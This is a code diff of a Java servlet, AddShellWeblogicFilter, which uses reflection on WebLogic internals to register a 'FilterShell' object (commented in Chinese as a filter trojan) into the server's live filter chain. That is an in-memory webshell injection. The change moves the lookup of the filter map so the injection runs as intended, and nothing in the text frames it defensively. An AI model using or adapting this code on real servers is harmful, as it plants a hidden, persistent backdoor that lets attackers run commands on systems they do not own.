@@ -31,6 +31,8 @@ public class AddShellWeblogicFilter extends HttpServlet {
         try {
             //先拿到Context
             weblogic.servlet.internal.WebAppServletContext context = (weblogic.servlet.internal.WebAppServletContext) req.getServletContext();
+
+
             Field filterManagerField =context.getClass().getDeclaredField("filterManager");
             filterManagerField.setAccessible(true);
 
@@ -50,8 +52,7 @@ public class AddShellWeblogicFilter extends HttpServlet {
             //准备filter马
             FilterShell filterShell = new FilterShell();
 
-            //获取filters
-            Map<String, FilterWrapper> filterWrapperMap = (Map<String, FilterWrapper>) filtersField.get(filterManager);
+
 
             //用wrapper包装filter
             Class<?> clz = Class.forName("weblogic.servlet.internal.FilterWrapper");
@@ -62,6 +63,9 @@ public class AddShellWeblogicFilter extends HttpServlet {
             Field ff = clz.getDeclaredField("filter");
             ff.setAccessible(true);
             ff.set(filterWrapper,filterShell);
+
+            //获取filters
+            Map<String, FilterWrapper> filterWrapperMap = (Map<String, FilterWrapper>) filtersField.get(filterManager);
 
             //添加到filters
             filterWrapperMap.put(filterShell.getClass().getName(),filterWrapper);
